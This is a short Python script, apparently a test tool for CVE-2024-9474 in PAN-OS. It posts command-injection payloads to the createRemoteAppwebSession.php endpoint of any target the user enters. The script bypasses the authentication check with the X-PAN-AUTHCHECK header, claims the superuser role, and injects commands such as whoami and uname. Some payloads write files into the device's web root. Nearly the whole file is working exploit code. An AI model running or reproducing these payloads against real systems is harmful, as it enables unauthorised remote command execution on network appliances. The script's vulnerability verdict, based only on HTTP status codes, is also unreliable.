# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_cve_2024_9474_payloads(target):
    if target.startswith("http://") or target.startswith("https://"):
        base_url = target.rstrip('/')
    else:
        base_url = f"http://{target.rstrip('/')}"
    
    url = f"{base_url}/php/utils/createRemoteAppwebSession.php"
    
    headers = {
        "User-Agent": "f53c_dr1ll_2O25",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-PAN-AUTHCHECK": "off"
    }

    # 명령어 인젝션 테스트용 페이로드 리스트
    payloads = [
        "whoami",
        "; whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "`echo $(uname -a) > /var/appweb/htdocs/unauth/test_drill.txt`",
        "test; echo vulnerable > /var/appweb/htdocs/unauth/test_drill.txt",
        "test | echo vulnerable > /var/appweb/htdocs/unauth/test_drill.txt",
        "`echo vulnerable > /var/appweb/htdocs/unauth/test_drill.txt`"
    ]
    
    for i, payload in enumerate(payloads, 1):
        data = f"user={payload}&userRole=superuser&remoteHost=&vsys=vsys1"
        print(f"\n[{i}] 페이로드 테스트: {payload}")
        
        try:
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
            print(f"HTTP 상태 코드: {response.status_code}")
            
            if response.status_code == 200:
                print("  -> 응답 성공: 취약 가능성 있음. 서버에 명령어 실행 권한이 있을 수 있습니다.")
                print("     (서버 파일 생성 여부 등 추가 확인 필요)")
            else:
                print("  -> 요청 실패 혹은 명령 실행 차단 가능성 있음.")
        
        except Exception as e:
            print(f"  -> 요청 중 오류 발생: {e}")

if __name__ == "__main__":
    target = input("테스트할 대상 IP 또는 URL 입력 (예: 192.168.0.1 또는 https://example.com): ").strip()
    test_cve_2024_9474_payloads(target)
